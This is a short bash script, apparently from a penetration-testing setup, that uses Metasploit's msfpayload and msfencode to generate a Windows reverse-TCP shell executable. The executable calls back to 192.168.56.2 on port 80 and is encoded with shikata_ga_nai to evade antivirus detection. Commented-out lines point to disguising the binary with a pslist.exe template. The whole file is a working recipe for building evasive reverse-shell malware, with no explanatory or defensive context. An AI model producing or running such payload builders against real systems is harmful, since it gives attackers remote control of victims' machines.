#!/bin/bash

PAYLOAD_SHORT=sh_rev
PAYLOAD=windows/shell/reverse_tcp
LHOST=192.168.56.2
LPORT=80
ENCODER_SHORT=shikata
ENCODER=x86/shikata_ga_nai
#TEMPLATE_SHORT=pslist
#TEMPLATE=/pentest/windows-binaries/pstools/pslist.exe
TYPE=exe

msfpayload $PAYLOAD LHOST=$LHOST,LPORT=$LPORT R | msfencode -c 1 -e $ENCODER -o ${PAYLOAD_SHORT}_${ENCODER_SHORT}_${LHOST}_${LPORT}.${TYPE} -t $TYPE
